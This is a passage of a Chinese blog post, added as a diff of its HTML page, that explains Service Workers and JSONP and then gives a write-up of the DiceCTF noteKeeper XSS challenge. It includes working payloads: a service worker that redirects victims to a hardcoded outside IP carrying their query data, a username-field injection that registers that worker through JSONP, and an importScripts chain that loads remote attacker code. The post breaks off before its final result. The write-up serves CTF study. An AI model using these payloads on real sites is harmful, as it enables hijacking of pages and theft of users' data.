@@ -1,0 +1,592 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>xss中关于service worker的使用 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/5.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="xss中关于service worker的使用">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-07 12:46" pubdate>
+        2021年11月7日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      61
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">xss中关于service worker的使用</h1>
+            
+            <div class="markdown-body">
+              <h1 id="关于Service-Worker在xss中的使用"><a href="#关于Service-Worker在xss中的使用" class="headerlink" title="关于Service Worker在xss中的使用"></a>关于Service Worker在xss中的使用</h1><p>这篇文章会介绍一下<code>Service Worker</code>在xss中的一些利用，主要是ctf题目中的应用。</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://brycec.me/posts/dicectf_2022_writeups#notekeeper">https://brycec.me/posts/dicectf_2022_writeups#notekeeper</a></p>
+<h2 id="service-worker-的简介"><a href="#service-worker-的简介" class="headerlink" title="service worker 的简介"></a>service worker 的简介</h2><h3 id="service-worker的概念"><a href="#service-worker的概念" class="headerlink" title="service worker的概念"></a>service worker的概念</h3><blockquote>
+<p>Service worker是一个注册在指定源和路径下的事件驱动<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Worker">worker</a>。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现。</p>
+<p>Service worker运行在worker上下文，因此它不能访问DOM。相对于驱动应用的主JavaScript线程，它运行在其他线程中，所以不会造成阻塞。它设计为完全异步，同步API（如<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XHR</a>和<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/API/DOM/Storage">localStorage</a>）不能在service worker中使用。</p>
+<p>出于安全考量，Service workers只能由HTTPS（出于调试方便，还支持在localhost使用），毕竟修改网络请求的能力暴露给中间人攻击会非常危险。在Firefox浏览器的<a target="_blank" rel="noopener" href="https://support.mozilla.org/zh-CN/kb/%E9%9A%90%E7%A7%81%E6%B5%8F%E8%A7%88">用户隐私模式</a>，Service Worker不可用。</p>
+</blockquote>
+<p>从官方文档中可以看出一些要点：</p>
+<p>1、只能注册同源下的js</p>
+<p>2、站内必须支持Secure Context，也就是站内必须是<code>https://</code>或者<code>http://localhost/</code></p>
+<p>3、Content-Type必须是js</p>
+<ul>
+<li>text/javascript</li>
+<li>application/x-javascript</li>
+<li>application/javascript</li>
+</ul>
+<p>还有一些关于<code>service worker</code>的基本框架以及作用域问题可以直接查看</p>
+<p>[]: <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers">https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers</a>    “文档”</p>
+<p>所以<code>service worker</code>到底可以用来干些什么呢。其实从它的作用域也能看出来一些东西，例如<code>service worker</code>只能抓取在service worker scope中发出来的请求，既然这样就可以利用它来进行一些文件，网站等的缓存，同时还以监听一些请求并对responce做出篡改。</p>
+<h2 id="service-worker的简单使用"><a href="#service-worker的简单使用" class="headerlink" title="service worker的简单使用"></a>service worker的简单使用</h2><p>在这个demo中当页面加载完成时，使用<code>navigator.serviceWorker.register</code>来注册一个<code>service worker</code>，并且作用于全局</p>
+<figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>navigator对象的使用<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;parentElement&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;childElement&quot;</span>&gt;</span>foo bar<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>     <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br><span class="javascript">        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;serviceWorker&#x27;</span> <span class="hljs-keyword">in</span> navigator) &#123;</span><br><span class="javascript">            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;ok&quot;</span>)</span><br><span class="javascript">              <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                navigator.serviceWorker.register(<span class="hljs-string">&#x27;sw.js&#x27;</span>, &#123;<span class="hljs-attr">scope</span>: <span class="hljs-string">&#x27;/&#x27;</span>&#125;) <span class="hljs-comment">//作用于全局</span></span><br><span class="javascript">                .then(<span class="hljs-function">() =&gt;</span> &#123;</span><br><span class="javascript">                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;successful&#x27;</span>)</span><br>                &#125;)<br><span class="javascript">                .catch(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;</span><br><span class="javascript">                  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;failed&#x27;</span>)</span><br>                &#125;)<br>              &#125;)<br>            &#125;<br>        <br>        <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>关于sw.js，从service worker的流程可以看出需要先监听install事件，这里在监听到安装后会进行缓存，然后就可以监听一些事件，但需要时serviceworker支持的事件。这里监听了一个<code>fetch</code>请求，同时篡改了响应，在其中插入了一个script标签</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201218123819-da94a1fe-40ea-1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">// 监听service worker的install事件</span><br><span class="hljs-built_in">this</span>.addEventListener(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">event</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 如果监听到了service worker已经安装成功的话</span><br>    <span class="hljs-comment">// 就会调用event.waitUtil回调函数</span><br>    event<br>        .waitUntil(<br>        <span class="hljs-comment">// 安装成功后调用CacheStorage缓存，使用之前先通过caches.open()</span><br>        <span class="hljs-comment">// 打开对应的缓存空间</span><br>            caches.open(<span class="hljs-string">&#x27;my-test-cache-v1&#x27;</span>)<br>            .then(<span class="hljs-function">(<span class="hljs-params">cache</span>) =&gt;</span> &#123;<br>                <span class="hljs-comment">// 通过cache缓存对象的addAll方法添加</span><br>                <span class="hljs-keyword">return</span> cache.addAll([<br>                    <span class="hljs-string">&#x27;/&#x27;</span>,<br>                    <span class="hljs-string">&#x27;/index.html&#x27;</span><br>                ])<br>            &#125;)<br>        )<br>&#125;)<br><span class="hljs-built_in">this</span>.addEventListener(<span class="hljs-string">&#x27;fetch&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>)</span>&#123;<br>            <span class="hljs-built_in">console</span>.log(event.request);<br>            event.respondWith(<br>            caches.match(event.request).then(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> Response(<span class="hljs-string">&#x27;&lt;script&gt;location=&quot;http://39.107.239.30:2333?&quot;+btoa(location.search)&lt;/script&gt;&#x27;</span>, &#123;<span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;&#125;)<br>            &#125;)<br>            )<br>&#125;)<br></code></pre></div></td></tr></table></figure>
+
+<p>访问一下可以很清楚的看到一些缓存</p>
+<p><img src="https://img-blog.csdnimg.cn/bef79f2e921b4b1b8c6f28de176de27c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="关于jsonp的跨域特点"><a href="#关于jsonp的跨域特点" class="headerlink" title="关于jsonp的跨域特点"></a>关于jsonp的跨域特点</h2><p>现在的浏览器普遍都有同源策略保护着，但是在同源下如何引用外来的js文件或者其他的文件呢。jsonp是可以解决一下跨域问题的。</p>
+<p><code>JSONP</code>的原理</p>
+<blockquote>
+<p><code>JSONP</code>是<code>JSON with Padding</code>的简称，一般用来解决<code>Ajax</code>跨域的问题。它是这样产生的：</p>
+<ol>
+<li>页面上调用<code>js</code>文件时不受跨域的影响，而且，凡是拥有<code>src</code>属性的标签都拥有跨域的能力，比如<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>。</li>
+<li>可以在远程服务器上设法把数据装进<code>js</code>格式的文件里，供客户端调用处理，实现跨域。</li>
+<li>目前最常用的数据交换方式是<code>JSON</code>，客户端通过调用远程服务器上动态生成的<code>js</code>格式文件（一般以<code>JSON</code>后缀）。</li>
+<li>客户端成功调用<code>JSON</code>文件后，对其进行处理。</li>
+<li>为了便于客户端使用数据，逐渐形成了一种非正式传输协议，人们把它称作<code>JSONP</code>，该协议的一个要点就是允许用户传递一个<code>callback</code>参数给服务端，然后服务端返回数据时会将这个<code>callback</code>参数作为函数名来包裹住<code>JSON</code>数据，这样客户端就可以随意定制自己的函数来自动处理返回数据了。</li>
+</ol>
+</blockquote>
+<p>一些jsonp的具体实现可以看看官方文档，其实就是通过一些字符串的拼接，来构造出特定的调用函数的形式，并将这种json返回给浏览器，从而在浏览器上而可以直接调用<code>js</code>格式文件</p>
+<h2 id="dicectf一道有趣的xss题目"><a href="#dicectf一道有趣的xss题目" class="headerlink" title="dicectf一道有趣的xss题目"></a>dicectf一道有趣的xss题目</h2><blockquote>
+<p>noteKeeper 是个有趣的 XSS 挑战，目标是窃取管理员的语音备忘录。</p>
+</blockquote>
+<h3 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h3><p>首先审计源码，看index可以发现使用了很严格的csp规则，无法使用iframe-src，同时限制了script的来源。但是这里很重要的一点就是，app在使用api路由中间件之后才使用了csp中间件，这意味着在api路由上并不存在csp规则，这样才有了后续的做法。</p>
+<p><img src="https://img-blog.csdnimg.cn/68a3d8ff5d4f4d36a2e195ced516b02e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>在前端的script.js文件中可以看到很明显的xss，<code>load_user</code>中直接将用户名赋值到了<code>innerHTML</code>中，并且没有任何过滤。所以这里可以插入一些html标签</p>
+<p><img src="https://img-blog.csdnimg.cn/076c792954954cec953bb42200a96d0e.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>再看到关于用户登陆注册的源码。在api中可以发现，在注册的地方进行了一些限制。username的长度要在[5,16]之间，这样的话显然需要绕过了。同时可以看到这段代码并没有检查username的类别，所以我们可以构造一个数组来进行绕过，类似于<code>username=&lt;xss payload&gt;&amp;username=b&amp;password=password</code>这样。但是 innerHTML 不允许 script 标签运行。但一个简单的解决方法就是使用 iframe srcdoc，并让<code>window.parent</code>用作对父窗口的引用。</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">router.post(<span class="hljs-string">&quot;/register&quot;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = req.body;<br><br>    <span class="hljs-keyword">if</span>(db.hasUser(username)) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">`A user already exists with username <span class="hljs-subst">$&#123;username&#125;</span>`</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(username.length &gt; <span class="hljs-number">16</span>) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">&quot;Invalid username&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(password.length &lt; <span class="hljs-number">5</span>) &#123;<br>        utils.alert(req, res, <span class="hljs-string">&quot;danger&quot;</span>, <span class="hljs-string">&quot;Please choose a longer password&quot;</span>);<br>        <span class="hljs-keyword">return</span> res.redirect(<span class="hljs-string">&quot;/&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">await</span> db.addUser(username, password);<br><br>    jwt.signData(res, username, &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&quot;Registered successfully&quot;</span>, <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;primary&quot;</span> &#125;);<br>    res.redirect(<span class="hljs-string">&quot;/home&quot;</span>);<br>&#125;);<br><br></code></pre></div></td></tr></table></figure>
+
+<p>能够执行xss代码了下面就需要考虑如何利用xss进行窃取语音备忘录了。继续审计源码可以发现很关键的jsonp函数，源码中限制了callback的类别，同时过滤了eval回调。同时后续的中间件也进行了 JSONP 过滤，该过滤会删除任何不是字母数字、点或括号的内容。这样的话我们直接在用户界面上执行xss有些不太现实。</p>
+<p><img src="https://img-blog.csdnimg.cn/891d3c67bb6645d4944afac0cb273772.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>到这里就需要service worker的作用了。引用一些出题人的原话：</p>
+<blockquote>
+<p>但是，如果我们可以让页面加载不在页面上的脚本呢？这是不可能的，因为有一个严格的 CSP，但还记的 CSP 是如何不在 /api 路由上的吗？</p>
+<p>我们能以某种方式在这些 API 路由之一上获取脚本吗？是的，我们可以，这要归功于服务人员的力量！（注意：显然服务人员被高估了，其他团队没有解决使用它们😢）</p>
+<p>服务人员很酷，因为他们获取安装脚本所在页面的 CSP。因此，如果我们从某个 API 端点使用 JSONP 安装脚本，它们将没有 CSP！</p>
+<p>使用 JSONP 端点，我们可以调用<code>window.parent.navigator.serviceWorker.register</code>它将从包含 JS 的页面注册一个服务工作者。我们可以让这个目标成为另一个 JSONP 端点，然后我们可以有一个回调，它在服务工作者范围内运行代码。但是我们可以运行什么服务工作者代码呢？</p>
+<p>我们希望完整的 JS 执行不受 JSONP 的限制，那么我们可以使用<code>import()</code>导入 JS 并从文件中运行它吗？嗯, 不, 因为<code>import()</code>在服务人员中不起作用。但是<code>importScripts()</code>有！</p>
+<p>因此，为了使用服务工作者获的完整的 JS 执行，我们需要控制两个 JSONP 端点，一个注册服务工作者并将脚本 URL 指向另一个 JSONP 端点，第二个 JSONP 端点需要运行<code>importScripts()</code>并指向一个具有JS我们控制。</p>
+</blockquote>
+<p>这是这道题目最核心的地方，也是很巧妙的地方。因为JSONP端点可以回调任意函数，所以我们可以注册一个service来使用外部的js文件，同时通过importScripts()导入。这样我们就能执行一个完整的任意js代码。</p>
+<p>还有关于备忘录访问的代码，再请求头中限制了<code>Sec-Fetch-Site</code>和<code>Sec-Fetch-Dest</code>。这些<code>Sec-Fetch</code>标头阻止我们仅获取音频 - 它需要放置在音频标签中。而且我们无法从缓存中获取它，因为有<code>Cache-Control</code>标头</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">router.get(<span class="hljs-string">&quot;/audio/file&quot;</span>, requiresLogin, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">if</span>(!db.getMemo(req.user.username)) &#123;<br>        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;no&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(req.header(<span class="hljs-string">&#x27;Sec-Fetch-Dest&#x27;</span>) !== <span class="hljs-string">&quot;audio&quot;</span> || req.header(<span class="hljs-string">&#x27;Sec-Fetch-Site&#x27;</span>) !== <span class="hljs-string">&quot;same-origin&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.status(<span class="hljs-number">404</span>).send(<span class="hljs-string">&#x27;no&#x27;</span>);<br>    &#125;<br><br>    res.setHeader(<span class="hljs-string">&#x27;content-type&#x27;</span>, <span class="hljs-string">&#x27;audio/mpeg&#x27;</span>);<br>    res.sendFile(db.getMemo(req.user.username), &#123; <span class="hljs-attr">root</span>: <span class="hljs-string">&quot;.&quot;</span> &#125;);<br>&#125;);<br></code></pre></div></td></tr></table></figure>
+
+<h3 id="攻击操作"><a href="#攻击操作" class="headerlink" title="攻击操作"></a>攻击操作</h3><p>利用fetch先注册，也可以抓包等等</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">fetch(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;<br>    method: <span class="hljs-string">&quot;POST&quot;</span>,<br>    headers: &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;,<br>    body: <span class="hljs-string">&quot;username=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">`//39.107.239.30:2333/notekeeper.js?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;`</span>) + <span class="hljs-string">&quot;&amp;username=b&amp;password=12345&quot;</span><br>&#125;);<br></code></pre></div></td></tr></table></figure>
+
+<p>登录成功后会自行执行，</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;iframe srcdoc=<span class="hljs-string">&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/script&gt;&quot;</span>&gt;&lt;/iframe&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>但是此时notes中我们并没有添加任何东西所以它是这样的</p>
+<p><img src="https://img-blog.csdnimg.cn/1108c6bf7c184f9bbbacdccd53572cd1.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>在这里我们如果直接写一个notes类似于<code>//39.107.239.30:2333/sw.js</code>，然后变成</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">/**/</span> <span class="hljs-keyword">typeof</span> <span class="hljs-built_in">window</span>.parent.navigator.serviceWorker.register === <span class="hljs-string">&#x27;function&#x27;</span> &amp;&amp; <span class="hljs-built_in">window</span>.parent.navigator.serviceWorker.register([<span class="hljs-string">&quot;//39.107.239.30:2333/sw.js&quot;</span>])<br></code></pre></div></td></tr></table></figure>
+
+<p>这看似很合理但实际上会是这样的</p>
+<p><img src="https://img-blog.csdnimg.cn/959bfd9e1e654619af4ff1b156cd20c0.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>所以出题人所说的<code>控制两个 JSONP 端点</code>一个是注册的时候利用一次jsonp端点回调，另外一次在于这里写入notes，这样的话便再一次通过jsonp的跨域特点绕过同源策略。</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">/api/user/info?callback=importScripts<br></code></pre></div></td></tr></table></figure>
+
+<p>其实做到这里最开始我在想为什么不直接importScripts我们的文件不就得了，然后在最后加一个注释符，类似于</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">/api/user/info?callback=importScripts(<span class="hljs-string">&#x27;//vps:port/notekeeper.js&#x27;</span>);<span class="hljs-comment">//</span><br></code></pre></div></td></tr></table></figure>
+
+<p>但是实践证实源码中使用的是<code>res.jsonp()</code>，所以在官方express的jsonp中进行了一些过滤。它会变成这样</p>
+<p><img src="https://img-blog.csdnimg.cn/56352d835ea54cf4b2022b2f8c7efdd9.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>所以正确导入后，最后的结果会是这样</p>
